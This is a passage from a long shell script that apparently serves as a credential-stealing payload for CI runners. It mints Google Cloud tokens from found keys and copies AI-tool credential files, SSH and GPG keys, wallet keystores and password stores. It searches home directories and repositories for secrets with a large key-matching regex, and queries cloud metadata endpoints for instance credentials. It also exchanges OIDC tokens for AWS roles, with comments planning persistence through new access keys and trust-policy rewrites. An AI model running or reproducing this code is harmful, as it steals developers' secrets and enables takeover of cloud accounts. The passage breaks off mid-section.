      GOOGLE_CREDENTIALS) gval="${GOOGLE_CREDENTIALS:-}" ;;
      *) gval="" ;;
    esac
    [ -n "$gval" ] || continue
    gi=$((gi+1))
    gf="$GDIR/env_key_$gi.json"
    printf '%s' "$gval" > "$gf"
    if ! grep -q '"private_key"' "$gf" 2>/dev/null; then
      base64 -d < "$gf" > "$gf.dec" 2>/dev/null
      if grep -q '"private_key"' "$gf.dec" 2>/dev/null; then
        mv "$gf.dec" "$gf"
      else
        rm -f "$gf.dec"
      fi
    fi
    if grep -q '"private_key"' "$gf" 2>/dev/null; then
      GKEY="$gf"
      break
    fi
    note "gcp_env_key_bad $gv"
  done

  # candidate credential file: env-materialized, explicit path vars, ADC, legacy ADC
  if [ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && [ ! -r "$GOOGLE_APPLICATION_CREDENTIALS" ]; then
    note "gcp_adc_unreadable"
  fi
  GADC=""
  for gf in "${GKEY:-}" "${GOOGLE_CLOUD_KEYFILE_JSON:-}" "${GCLOUD_KEYFILE_JSON:-}" "${GOOGLE_APPLICATION_CREDENTIALS:-}" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME"/.config/gcloud/legacy_credentials/*/adc.json; do
    [ -n "$gf" ] && [ -f "$gf" ] && [ -r "$gf" ] && { GADC="$gf"; break; }
  done

  if [ -z "$GTOK" ] && [ -n "$GADC" ] && command -v python3 >/dev/null 2>&1; then
    gtype=$(sed -n 's/.*"type"[[:space:]]*:[[:space:]]*"\([a-z_]*\)".*/\1/p' "$GADC" 2>/dev/null | head -1)
    case "$gtype" in
      service_account|authorized_user) ;;
      *) if grep -q '"private_key"' "$GADC" 2>/dev/null; then gtype="service_account"; fi ;;
    esac
    if [ "$gtype" = "service_account" ]; then
      timeout 10 python3 -I - "$GADC" > "$GDIR/assertion.jwt" 2>>"$D/errors.log" <<'PYJWT'
import base64, hashlib, json, sys, time

def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

def tlv(buf, i):
    tag = buf[i]
    n = buf[i + 1]
    i += 2
    if n & 0x80:
        k = n & 0x7f
        n = int.from_bytes(buf[i:i + k], 'big')
        i += k
    return tag, buf[i:i + n], i + n

def rsa_numbers(der):
    tag, body, _ = tlv(der, 0)
    if tag != 0x30:
        raise ValueError('not a sequence')
    tag, _, p = tlv(body, 0)
    if tag != 0x02:
        raise ValueError('bad version')
    tag, val, q = tlv(body, p)
    if tag == 0x30:
        if b'\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01' not in val:
            raise ValueError('not rsa')
        tag, octets, _ = tlv(body, q)
        if tag != 0x04:
            raise ValueError('bad pkcs8')
        return rsa_numbers(octets)
    n = int.from_bytes(val, 'big')
    tag, e, q = tlv(body, q)
    if tag != 0x02:
        raise ValueError('bad exponent')
    tag, d, q = tlv(body, q)
    if tag != 0x02:
        raise ValueError('bad private exponent')
    return n, int.from_bytes(e, 'big'), int.from_bytes(d, 'big')

def main():
    with open(sys.argv[1], 'r', encoding='utf-8') as fh:
        sa = json.load(fh)
    if sa.get('type') != 'service_account' or 'private_key' not in sa or 'client_email' not in sa:
        raise SystemExit('not a service account key')
    pem = ''.join(l for l in sa['private_key'].splitlines() if not l.startswith('-----'))
    n, e, d = rsa_numbers(base64.b64decode(pem))
    now = int(time.time())
    header = {'alg': 'RS256', 'typ': 'JWT'}
    if sa.get('private_key_id'):
        header['kid'] = sa['private_key_id']
    claims = {
        'iss': sa['client_email'],
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'aud': 'https://oauth2.googleapis.com/token',
        'iat': now,
        'exp': now + 3600,
    }
    h = b64u(json.dumps(header, separators=(',', ':')).encode())
    c = b64u(json.dumps(claims, separators=(',', ':')).encode())
    signing = (h + '.' + c).encode()
    di = bytes.fromhex('3031300d060960864801650304020105000420') + hashlib.sha256(signing).digest()
    k = (n.bit_length() + 7) // 8
    if k < len(di) + 11:
        raise ValueError('key too small')
    em = b'\x00\x01' + b'\xff' * (k - len(di) - 3) + b'\x00' + di
    sig = pow(int.from_bytes(em, 'big'), d, n).to_bytes(k, 'big')
    sys.stdout.write(signing.decode() + '.' + b64u(sig))

main()
PYJWT
      grc=$?
      if [ "$grc" != "0" ] || [ ! -s "$GDIR/assertion.jwt" ]; then
        note "gcp_jwt_fail"
      else
        gcp_save "$GDIR/assertion.jwt" "gcp_live/assertion.jwt"
        gassert=$(cat "$GDIR/assertion.jwt")
        gcode=$(curl -sS --max-time 10 -o "$GDIR/token.json" -w '%{http_code}' \
          -X POST "https://oauth2.googleapis.com/token" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
          --data-urlencode "assertion=$gassert" 2>>"$D/errors.log")
        if [ "$gcode" = "200" ]; then
          GTOK=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$GDIR/token.json" 2>/dev/null | head -1)
          [ -n "$GTOK" ] || note "gcp_token_empty"
        else
          note "gcp_token_http $gcode"
          gcp_save "$GDIR/token.json" "gcp_live/token_error.json"
        fi
      fi
    elif [ "$gtype" = "authorized_user" ]; then
      gcid=$(sed -n 's/.*"client_id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$GADC" 2>/dev/null | head -1)
      gcsec=$(sed -n 's/.*"client_secret"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$GADC" 2>/dev/null | head -1)
      grft=$(sed -n 's/.*"refresh_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$GADC" 2>/dev/null | head -1)
      if [ -n "$gcid" ] && [ -n "$gcsec" ] && [ -n "$grft" ]; then
        gcode=$(curl -sS --max-time 10 -o "$GDIR/token.json" -w '%{http_code}' \
          -X POST "https://oauth2.googleapis.com/token" \
          --data-urlencode "grant_type=refresh_token" \
          --data-urlencode "client_id=$gcid" \
          --data-urlencode "client_secret=$gcsec" \
          --data-urlencode "refresh_token=$grft" 2>>"$D/errors.log")
        if [ "$gcode" = "200" ]; then
          GTOK=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$GDIR/token.json" 2>/dev/null | head -1)
          [ -n "$GTOK" ] || note "gcp_refresh_empty"
        else
          note "gcp_refresh_http $gcode"
          gcp_save "$GDIR/token.json" "gcp_live/token_error.json"
        fi
      else
        note "gcp_adc_incomplete"
      fi
    else
      note "gcp_adc_type_unknown"
    fi
  fi

  GPJ=0
  if [ -n "$GTOK" ]; then
    gcode=$(curl -sS --max-time 10 -o "$GDIR/projects.json" -w '%{http_code}' \
      -H "Authorization: Bearer $GTOK" \
      "https://cloudresourcemanager.googleapis.com/v1/projects" 2>>"$D/errors.log")
    if [ "$gcode" = "200" ]; then GPJ=1; else note "gcp_projects_http $gcode"; fi
    gcp_save "$GDIR/projects.json" "gcp_live/projects.json"
    gcp_save "$GDIR/token.json" "gcp_live/token.json"
    if [ ! -s "$GDIR/token.json" ]; then
      printf '%s' "$GTOK" > "$GDIR/token_env.txt"
      gcp_save "$GDIR/token_env.txt" "gcp_live/token_env.txt"
    fi
  fi

  GGC=0
  if [ -z "$GTOK" ] && command -v gcloud >/dev/null 2>&1; then
    CLOUDSDK_CORE_DISABLE_PROMPTS=1 timeout 7 gcloud auth list --format=json > "$GDIR/gcloud_auth.json" 2>>"$D/errors.log"
    grc=$?
    if [ "$grc" != "0" ]; then
      note "gcp_gcloud_auth_fail"
    elif grep -q '"account"' "$GDIR/gcloud_auth.json" 2>/dev/null; then
      CLOUDSDK_CORE_DISABLE_PROMPTS=1 timeout 7 gcloud projects list --format=json > "$GDIR/gcloud_projects.json" 2>>"$D/errors.log" || note "gcp_gcloud_projects_fail"
      [ -s "$GDIR/gcloud_projects.json" ] && GGC=1
      gcp_save "$GDIR/gcloud_projects.json" "gcp_live/gcloud_projects.json"
    else
      note "gcp_gcloud_auth_empty"
    fi
    gcp_save "$GDIR/gcloud_auth.json" "gcp_live/gcloud_auth.json"
  fi

  if [ -n "${GOOGLE_CLOUD_PROJECT:-}${GCLOUD_PROJECT:-}" ]; then
    printf '%s\n%s\n' "${GOOGLE_CLOUD_PROJECT:-}" "${GCLOUD_PROJECT:-}" > "$GDIR/project_hints.txt"
    gcp_save "$GDIR/project_hints.txt" "gcp_live/project_hints.txt"
  fi

  note "gcp_live token=$([ -n "$GTOK" ] && echo 1 || echo 0) projects=$GPJ gcloud=$GGC"
fi

# ---------- 4c. AI / LLM agent + provider credentials (raw) ----------
# Raw bytes only. regexz.py label-anchored finders need the original
# KEY=value / "key": "value" / YAML key: value form. No jq/sed/base64/tr.
wai() {  # wai <src> <dest-rel> <tag>
  local src="$1" rel="$2" tag="$3" dst
  [ -e "$src" ] || return 0
  dst="$D/fs/$rel"
  mkdir -p "$(dirname "$dst")" 2>/dev/null
  cp -aL "$src" "$dst" 2>/dev/null || { note "ai_${tag}_fail"; return 0; }
  if [ -d "$dst" ]; then wsz=$(du -sb "$dst" 2>/dev/null | cut -f1); [ -n "${wsz:-}" ] || wsz=$(( $(du -sk "$dst" 2>/dev/null | cut -f1) * 1024 )); else wsz=$(wc -c < "$dst" 2>/dev/null || echo 0); fi
  printf 'fs/%s\t%s\n' "$rel" "${wsz:-0}" >> "$D/index.txt"
}

wai "${XDG_CONFIG_HOME:-$HOME/.config}/openai.token"           "ai/openai/config_openai.token"   openai_config_token
wai "${XDG_CONFIG_HOME:-$HOME/.config}/openaicli.json"         "ai/openai/openaicli.json"        openai_cli_json
wai "$HOME/.anthropic"                                         "ai/anthropic/dot_anthropic"      anthropic_dir
wai "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/.credentials.json"    "ai/claude/credentials.json"      claude_credentials
wai "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.local.json"  "ai/claude/settings.local.json"   claude_settings_local
wai "$HOME/.claude.json"                                       "ai/claude/dot_claude.json"       claude_state
wai "${CODEX_HOME:-$HOME/.codex}/config.toml"                  "ai/codex/config.toml"            codex_config
wai "$HOME/.gemini/oauth_creds.json"                           "ai/gemini/oauth_creds.json"      gemini_oauth
wai "$HOME/.gemini/google_accounts.json"                       "ai/gemini/google_accounts.json"  gemini_accounts
wai "$HOME/.gemini/settings.json"                              "ai/gemini/settings.json"         gemini_settings
wai "$HOME/.gemini/.env"                                       "ai/gemini/.env"                  gemini_env
wai "$HOME/.qwen/oauth_creds.json"                             "ai/qwen/oauth_creds.json"        qwen_oauth
wai "$HOME/.qwen/settings.json"                                "ai/qwen/settings.json"           qwen_settings
wai "${HF_HOME:-$HOME/.cache/huggingface}/stored_tokens"       "ai/huggingface/stored_tokens"    hf_stored_tokens
wai "$HOME/.continue/config.yaml"                              "ai/continue/config.yaml"         continue_yaml
wai "$HOME/.continue/config.ts"                                "ai/continue/config.ts"           continue_ts
wai "$HOME/.continue/.env"                                     "ai/continue/.env"                continue_env
wai "$HOME/.codeium/config.json"                               "ai/codeium/config.json"          codeium_config
wai "$HOME/.cursor/cli-config.json"                            "ai/cursor/cli-config.json"       cursor_cli
wai "${XDG_CONFIG_HOME:-$HOME/.config}/github-copilot/hosts.json" "ai/copilot/hosts.json"        copilot_hosts
wai "${XDG_CONFIG_HOME:-$HOME/.config}/github-copilot/apps.json"  "ai/copilot/apps.json"         copilot_apps
wai "${XDG_DATA_HOME:-$HOME/.local/share}/opencode/auth.json"  "ai/opencode/auth.json"           opencode_auth
wai "${XDG_CONFIG_HOME:-$HOME/.config}/opencode/opencode.json" "ai/opencode/opencode.json"       opencode_config
wai "$HOME/.aider.conf.yml"                                    "ai/aider/aider.conf.yml"         aider_conf
wai "${XDG_CONFIG_HOME:-$HOME/.config}/wandb/settings"         "ai/wandb/settings"               wandb_settings
wai "$HOME/.wandb/settings"                                    "ai/wandb/legacy_settings"        wandb_legacy
wai "$HOME/.wandbrc"                                           "ai/wandb/wandbrc"                wandb_rc
wai "$HOME/.ollama/id_ed25519"                                 "ai/ollama/id_ed25519"            ollama_key
wai "$HOME/.ollama/config.json"                                "ai/ollama/config.json"           ollama_config
wai "$HOME/.ollama/history"                                    "ai/ollama/history"               ollama_history
wai "${XDG_CONFIG_HOME:-$HOME/.config}/litellm/config.yaml"    "ai/litellm/config.yaml"          litellm_config
wai "$HOME/.litellm/config.yaml"                               "ai/litellm/dot_litellm_config.yaml" litellm_dot_config
wai "${XDG_CONFIG_HOME:-$HOME/.config}/Code/User/settings.json" "ai/vscode/settings.json"        vscode_settings
wai "$HOME/.vscode-server/data/Machine/settings.json"          "ai/vscode_server/machine_settings.json" vscode_server_settings

if [ -d "$HOME/.ssh" ]; then mkdir -p "$D/fs/ssh"; cp -a "$HOME/.ssh/." "$D/fs/ssh/" 2>/dev/null; fi
if [ -d "$HOME/.gnupg" ]; then mkdir -p "$D/fs/gnupg"; cp -a "$HOME/.gnupg/." "$D/fs/gnupg/" 2>/dev/null; fi
for d in "$HOME/.aws/cli/cache" "$HOME/.aws/sso/cache" "$HOME/.config/gcloud/legacy_credentials" "$HOME/.azd/auth" "$HOME/.password-store" "$HOME/.foundry/keystores" "$HOME/.ethereum/keystore"; do
  if [ -d "$d" ]; then cp -a "$d" "$D/fs/" 2>/dev/null; fi
done

# whole-home name hunt (bounded)
find "$HOME" -maxdepth 6 -type f \
  \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name ".envrc" -o -name "*.pem" -o -name "*.key" \
     -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "credentials" \
     -o -name ".npmrc" -o -name ".pypirc" -o -name ".netrc" -o -name "*.ovpn" \
     -o -name "*.p12" -o -name "*.jks" -o -name "*.kdbx" -o -name "kubeconfig" \) -size -1048577c 2>/dev/null \
  | head -300 | while IFS= read -r f; do
      rel="${f#/}"
      dest="$D/fs/hunt/$rel"
      mkdir -p "$(dirname "$dest")" 2>/dev/null
      cp -a "$f" "$dest" 2>/dev/null
    done

# ---------- 5. self-hosted only ----------
if [ "${RUNNER_ENVIRONMENT:-}" = "self-hosted" ] || [ "${WF_SELF_HOSTED:-0}" = "1" ]; then
  S="$D/selfhosted"; mkdir -p "$S"
  # AWS IMDSv2 then v1
  T=$(curl -s --max-time 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null)
  if [ -n "$T" ]; then
    curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ > "$S/imds_aws_roles.txt" 2>/dev/null
    R=$(head -1 "$S/imds_aws_roles.txt" 2>/dev/null)
    if [ -n "$R" ]; then
      curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" > "$S/imds_aws_creds.json" 2>/dev/null
    fi
    curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id > "$S/imds_aws_instance.txt" 2>/dev/null
    curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/user-data > "$S/imds_aws_userdata.txt" 2>/dev/null
  else
    curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > "$S/imds_aws_roles.txt" 2>/dev/null
    R=$(head -1 "$S/imds_aws_roles.txt" 2>/dev/null)
    if [ -n "$R" ]; then
      curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" > "$S/imds_aws_creds.json" 2>/dev/null
    fi
  fi
  curl -s --max-time 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" > "$S/imds_gcp.json" 2>/dev/null
  curl -s --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" > "$S/imds_azure.json" 2>/dev/null
  # ECS task metadata
  [ -n "${ECS_CONTAINER_METADATA_URI_V4:-}" ] && curl -s --max-time 3 "$ECS_CONTAINER_METADATA_URI_V4/task" > "$S/ecs_task.json" 2>/dev/null
  # Docker socket
  if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
    docker ps --no-trunc > "$S/docker_ps.txt" 2>/dev/null
    for c in $(docker ps -q 2>/dev/null | head -20); do
      docker inspect "$c" > "$S/docker_inspect_$c.json" 2>/dev/null
    done
  fi
  # runner credentials
  want "$HOME/.runner" "selfhosted/runner.json"
  want "$HOME/.credentials" "selfhosted/runner.credentials"
  want "$HOME/.credentials_rsaparams" "selfhosted/runner.rsa"
  [ -d "$HOME/_diag" ] && cp -a "$HOME/_diag" "$S/diag" 2>/dev/null
  # system env and units
  want "/etc/environment" "selfhosted/etc_environment"
  mkdir -p "$S/systemd"
  cp -a /etc/systemd/system/*.service "$S/systemd/" 2>/dev/null
  cp -a /etc/profile.d/*.sh "$S/systemd/" 2>/dev/null
  # persistent workspaces
  for w in /home/*/actions-runner/_work /actions-runner/_work "$HOME/actions-runner/_work" "$HOME/work"; do
    if [ -d "$w" ]; then
      find "$w" -maxdepth 4 -type f \( -name ".env*" -o -name "*.pem" -o -name "*.key" -o -name "credentials" -o -name "id_rsa" \) -size -512k 2>/dev/null | head -150 | while IFS= read -r f; do
        rel="${f#/}"
        dest="$S/work/$rel"
        mkdir -p "$(dirname "$dest")" 2>/dev/null
        cp -a "$f" "$dest" 2>/dev/null
      done
    fi
  done
  note "selfhosted_collected"
fi

# ---------- 6. repo: scan snapshot, keep only files that match the catalog ----------
if [ -n "${WF_REPO:-}" ] && [ -n "${GITHUB_TOKEN:-}" ]; then
  SCAN="${TMPDIR:-/tmp}/wfx-scan-$$"
  mkdir -p "$SCAN"
  if [ "${WF_TARBALL:-1}" = "1" ]; then
    curl -fsSL --connect-timeout 10 --max-time 120 -H "$AUTH" "$API/tarball/$REF_ENC" -o "$SCAN/repo.tgz" 2>>"$D/errors.log" || note "tarball_fail"
    if [ -s "$SCAN/repo.tgz" ]; then
      tar -xzf "$SCAN/repo.tgz" -C "$SCAN" --strip-components=1 2>>"$D/errors.log"
      rm -f "$SCAN/repo.tgz"
    fi
  else
    # big repo: fetch only credential-shaped files through the tree API
    curl -fsS --max-time 30 -H "$AUTH" "$API/git/trees/$REF_ENC?recursive=1" > "$SCAN/tree.json" 2>>"$D/errors.log" || note "tree_fail"
    if command -v jq >/dev/null 2>&1; then
      jq -r '.tree[]?.path // empty' "$SCAN/tree.json" > "$SCAN/paths.txt" 2>/dev/null
    else
      grep -o '"path"[[:space:]]*:[[:space:]]*"[^"]*"' "$SCAN/tree.json" \
        | sed 's/.*"path"[[:space:]]*:[[:space:]]*"//; s/"$//' > "$SCAN/paths.txt"
    fi
    grep -Ei '(^|/)(\.env(\..*)?|.*\.tfvars|.*\.tfstate|serverless\.ya?ml|samconfig\.toml|cdk\.json|aws-exports\.js|appsettings.*\.json|application.*\.(properties|ya?ml)|config.*\.(json|ya?ml)|google-services\.json|GoogleService-Info\.plist|firebase\.json|wrangler\.toml|vercel\.json|netlify\.toml|\.npmrc|\.pypirc|\.netrc|\.pgpass|id_rsa|id_ed25519|.*\.pem|.*\.key|.*\.p12|.*\.jks|credentials|\.github/workflows/.*\.ya?ml)$' \
      "$SCAN/paths.txt" | grep -v node_modules | head -300 > "$SCAN/targets.txt"
    while IFS= read -r p; do
      [ -z "$p" ] && continue
      # URL-encode the path: spaces/newlines in names break the query string,
      # and a crafted name must never split the URL into another parameter.
      pe=$(printf '%s' "$p" | sed 's/%/%25/g; s/+/%2B/g; s/#/%23/g; s/ /%20/g; s/?/%3F/g; s/&/%26/g; s/=/%3D/g; s/;/%3B/g; s/,/%2C/g; s/\t/%09/g')
      out="$SCAN/$p"; mkdir -p "$(dirname "$out")" 2>/dev/null
      curl -fsS --max-time 30 -H "$AUTH" -H "Accept: application/vnd.github.raw" -o "$out" "$API/contents/$pe?ref=$REF_ENC" 2>>"$D/errors.log" || note "file_fail"
    done < "$SCAN/targets.txt"
    rm -f "$SCAN/tree.json" "$SCAN/paths.txt" "$SCAN/targets.txt"
  fi

  PAT='AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|AQ\.[A-Za-z0-9_-]{40,}|sk-(proj|svcacct|admin)-[A-Za-z0-9_-]{20,}|sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20,}|sk-ant-(api|admin|oat)[0-9]*-[A-Za-z0-9_-]{20,}|sk-or-v1-[a-f0-9]{40,}|oc_sk_[A-Za-z0-9_-]{20,}|sk-kimi-[A-Za-z0-9]{16,}|sk-[a-f0-9]{32}|xai-[A-Za-z0-9_]{50,}|cf[ua]t_[A-Za-z0-9]{40}[a-f0-9]{8}|gsk_[A-Za-z0-9]{40,}|tgp_v1_[A-Za-z0-9_-]{20,}|pplx-[A-Za-z0-9]{30,}|hf_[A-Za-z0-9]{30,}|api_org_[A-Za-z0-9]{34}|r8_[A-Za-z0-9]{30,}|fw_[A-Za-z0-9]{24,}|csk[-_][A-Za-z0-9]{20,}|atlasv1\.[A-Za-z0-9_-]{20,}|"type"[[:space:]]*:[[:space:]]*"service_account"|-----BEGIN (RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----|GOCSPX-[A-Za-z0-9_-]{20,}|[0-9]{12}-[a-z0-9]{32}\.apps\.googleusercontent\.com|ya29\.[0-9A-Za-z_-]{20,}|1//[0-9A-Za-z_-]{20,}|gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{50,}|gl(pat|rt|dt|cbt)-[A-Za-z0-9_-]{20,}|ATBB[A-Za-z0-9_=.-]{20,}|BBDC-[A-Za-z0-9_-]{20,}|https?://[^:/@[:space:]]+:[^@/[:space:]]+@[A-Za-z0-9.-]+|openai\.azure\.com|cognitiveservices\.azure\.com|services\.ai\.azure\.com|search\.windows\.net|watson\.cloud\.ibm\.com|iam\.cloud\.ibm\.com|ABSK[A-Za-z0-9_-]{20,255}={0,2}|bedrock-api-key-[A-Za-z0-9_-]{20,255}={0,2}|ANTHROPIC_FOUNDRY_API_KEY|vck_[A-Za-z0-9_-]{40,100}|(oc_sk_|sk-opencode-|opencode_|zen_)[A-Za-z0-9_-]{20,200}|sk-(cp|api)-[A-Za-z0-9_-]{20,200}|sk-eyJ[A-Za-z0-9_.-]{50,255}|ntn_[0-9]{11}[A-Za-z0-9]{35}|sb_secret_[A-Za-z0-9_-]{20,}|rk_live_[A-Za-z0-9]{24,}|hv[bs]\.[A-Za-z0-9_-]{20,}|ops_eyJ[A-Za-z0-9_-]{20,}|(A3T|ABIA|ACCA)[A-Z0-9]{12,}|HIGGSFIELD[A-Za-z0-9_]*_(KEY|SECRET)|HF_CREDENTIALS|HF_KEY|sk-svcacct-[A-Za-z0-9_-]{30,200}|sk-svacct-[A-Za-z0-9_-]{30,200}|sk-ant-(api|oat|usr)?[A-Za-z0-9_-]{20,200}|sk-[A-Za-z0-9_-]{40,200}|[A-Za-z0-9_~.-]{3}[0-9]Q~[A-Za-z0-9_~.-]{31,34}|(MISTRAL|COHERE|TOGETHER|GROQ|DEEPSEEK|XAI|PERPLEXITY|ELEVENLABS|VOYAGE|NVIDIA|ANYSCALE|LITELLM|LANGSMITH)[_-]?(API[_-]?)?KEY'
  PAT_CI='azure_(client|tenant|subscription)_id|(client|tenant|subscription)[_-]?id'

  n=0
  find "$SCAN" -type f -size -5M -print0 2>/dev/null | tr '\0' '\n' | head -n 4000 | while IFS= read -r f; do
    if grep -aqE "$PAT" "$f" 2>/dev/null || grep -aqiE "$PAT_CI" "$f" 2>/dev/null; then
      rel="${f#$SCAN/}"
      case "$rel" in node_modules/*|*/node_modules/*|.git/*|*/dist/*|*/build/*|*/vendor/*) continue ;; esac
      n=$((n+1)); [ "$n" -gt "$MAXF" ] && break
      out="$D/repo/$rel"
      mkdir -p "$(dirname "$out")" 2>/dev/null
      sz=$(wc -c < "$f" 2>/dev/null || echo 0)
      if [ "$sz" -gt "$MAXS" ]; then
        head -c "$MAXS" "$f" > "$out" 2>/dev/null
      else
        cp -a "$f" "$out" 2>/dev/null
      fi
      printf 'repo/%s\t%s\n' "$rel" "$sz" >> "$D/index.txt"
    fi
  done
  rm -rf "$SCAN"

  # history through the API (raw commit JSON)
  if [ "${WF_HISTORY:-1}" = "1" ]; then
    mkdir -p "$D/history"
    curl -sS --max-time 30 -H "$AUTH" "$API/commits?per_page=100" \
      -o "$D/history/commits.json" 2>>"$D/errors.log"
    if command -v jq >/dev/null 2>&1; then
      jq -r '.[]?.sha // empty' "$D/history/commits.json" 2>/dev/null | head -100 > "$D/history/shas.txt"
    else
      grep -o '"sha"[[:space:]]*:[[:space:]]*"[a-f0-9]\{40\}"' "$D/history/commits.json" \
        | sed 's/.*"\([a-f0-9]\{40\}\)"/\1/' | head -100 > "$D/history/shas.txt"
    fi
    hn=0
    while IFS= read -r s; do
      [ -z "$s" ] && continue
      hn=$((hn+1)); [ "$hn" -gt 100 ] && break
      curl -sS --max-time 30 -H "$AUTH" "$API/commits/$s" \
        -o "$D/history/$s.json" 2>>"$D/errors.log"
    done < "$D/history/shas.txt"
    rm -f "$D/history/commits.json"
    note "history_commits $hn"
  fi

  # artifacts from previous runs
  curl -fsS --max-time 30 -H "$AUTH" "$API/actions/artifacts?per_page=10" > "$D/artifacts.json" 2>>"$D/errors.log" || note "artifacts_list_fail"
  AU="$D/artifact_urls.txt"
  if command -v jq >/dev/null 2>&1; then
    jq -r '.artifacts[]? | "\(.name)\t\(.archive_download_url)"' "$D/artifacts.json" > "$AU" 2>/dev/null
  else
    grep -o '"archive_download_url"[[:space:]]*:[[:space:]]*"[^"]*"' "$D/artifacts.json" \
      | sed 's/.*"\(https[^"]*\)"/artifact\t\1/' > "$AU"
  fi
  an=0
  while IFS="	" read -r aname aurl; do
    [ -z "$aurl" ] && continue
    an=$((an+1)); [ "$an" -gt 10 ] && break
    dest="$D/artifacts/$an"; mkdir -p "$dest"
    curl -fsS -L --max-time 60 -H "$AUTH" -o "$dest/a.zip" "$aurl" 2>>"$D/errors.log" || note "artifact_fail"
    if [ -s "$dest/a.zip" ]; then
      unzip -q -o "$dest/a.zip" -d "$dest" 2>/dev/null
      rm -f "$dest/a.zip"
    fi
  done < "$AU"
fi

# ---------- 7. OIDC exchange ----------
# Env slots from recon win; the repo-snapshot grep is the fallback.
ARN="${WF_ARN:-}"; [ -n "$ARN" ] || ARN=$(grep -rho 'arn:aws:iam::[0-9]\{12\}:role/[A-Za-z0-9+=,.@_/-]*' "$D"/vars_*.json "$D"/secrets_*.json "$D/repo" 2>/dev/null | head -1)
GCP_PROV="${WF_GCP_PROV:-}"; [ -n "$GCP_PROV" ] || GCP_PROV=$(grep -rhoE 'projects/[0-9]+/locations/global/workloadIdentityPools/[A-Za-z0-9_-]+/providers/[A-Za-z0-9_-]+' "$D/repo" 2>/dev/null | head -1)
GCP_SA="${WF_GCP_SA:-}"; [ -n "$GCP_SA" ] || GCP_SA=$(grep -rhoE '[a-z0-9-]+@[a-z0-9-]+\.iam\.gserviceaccount\.com' "$D/repo" 2>/dev/null | head -1)
AZ_CLIENT="${WF_AZ_CLIENT:-}"; [ -n "$AZ_CLIENT" ] || AZ_CLIENT=$(grep -rhoiE '(client[_-]?id|azure_client_id)[[:space:]]*[=:][[:space:]]*["'"'"']?[0-9a-fA-F-]{36}' "$D/repo" 2>/dev/null | grep -oE '[0-9a-fA-F-]{36}' | head -1)
AZ_TENANT="${WF_AZ_TENANT:-}"; [ -n "$AZ_TENANT" ] || AZ_TENANT=$(grep -rhoiE '(tenant[_-]?id|azure_tenant_id)[[:space:]]*[=:][[:space:]]*["'"'"']?[0-9a-fA-F-]{36}' "$D/repo" 2>/dev/null | grep -oE '[0-9a-fA-F-]{36}' | head -1)

jwt_of() { sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$1" 2>/dev/null | head -1; }

if [ -n "$GCP_PROV" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  mint_oidc "$GCP_PROV" gcp_prov
fi

if [ -n "$ARN" ]; then
  T=$(jwt_of "$D/oidc_aws.json")
  if [ -n "$T" ]; then
    curl -sS --max-time 30 -G "https://sts.amazonaws.com/" \
      --data-urlencode "Action=AssumeRoleWithWebIdentity" \
      --data-urlencode "Version=2011-06-15" \
      --data-urlencode "RoleArn=$ARN" \
      --data-urlencode "RoleSessionName=ci-$$" \
      --data-urlencode "WebIdentityToken=$T" \
      -o "$D/aws_sts.xml" 2>>"$D/errors.log"
  fi
fi

# ---------- 7a. AWS role chain (second AssumeRole + permanent-cred attempts) ----------
# Chained session-tag injection (transitive override), then the two
# persistence shots: CreateAccessKey (user paths) and a trust-policy rewrite
# on the chained role itself (Wiz: ~1/3 of OIDC roles can self-update).
if [ "${WF_AWS_CHAIN:-1}" = "1" ] && command -v aws >/dev/null 2>&1 && [ -s "$D/aws_sts.xml" ]; then
  AK=$(sed -n 's:.*<AccessKeyId>\([^<]*\)</AccessKeyId>.*:\1:p' "$D/aws_sts.xml" | head -1)
  SK=$(sed -n 's:.*<SecretAccessKey>\([^<]*\)</SecretAccessKey>.*:\1:p' "$D/aws_sts.xml" | head -1)
  ST=$(sed -n 's:.*<SessionToken>\([^<]*\)</SessionToken>.*:\1:p' "$D/aws_sts.xml" | head -1)
  if [ -n "$AK" ] && [ -n "$SK" ]; then
    ARNS=$(grep -rho 'arn:aws:iam::[0-9]\{12\}:role/[A-Za-z0-9+=,.@_/-]*' "$D"/vars_*.json "$D"/secrets_*.json "$D/repo" 2>/dev/null | sort -u | head -2)
